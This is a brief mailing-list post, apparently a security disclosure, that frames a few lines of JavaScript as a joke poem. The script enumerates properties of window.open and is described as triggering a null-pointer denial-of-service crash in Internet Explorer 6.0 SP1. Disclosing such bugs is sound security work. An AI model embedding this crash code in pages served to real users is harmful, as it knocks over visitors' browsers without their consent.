Subject: I small poem in JScript


I just wrote a small poem in JScript:

<SCRIPT language="javascript">

  MSIE = window.open; // for hackers to come in
  for (every_bug_found in MSIE) { /* there are zillions more hiden */ }

</SCRIPT>

Ok, so it doen't rhyme... but it is another null-pointer exception DoS in MSIE 6.0sp1 (fully patched) ;)

Cheers,
SkyLined
